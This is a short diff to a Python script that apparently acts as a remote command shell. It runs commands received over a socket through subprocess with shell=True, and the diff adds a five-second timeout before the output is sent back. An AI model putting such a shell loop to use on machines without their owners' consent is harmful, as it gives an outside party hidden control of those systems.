@@ -39,8 +39,11 @@ while True:
         output = subprocess.getoutput(command)
         output = "Echoed!"
     else: #if the user doesn't want to change directories, run the command and capture the output
-        output = subprocess.getoutput(command)
-
+        #if the command runs for longer than 5 seconds, timeout
+        try:
+            output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
+        except subprocess.TimeoutExpired:
+            continue
     message = f"{output}" #encapsulate the output and send it
     s.send(message.encode())
 s.close() #close the socket 
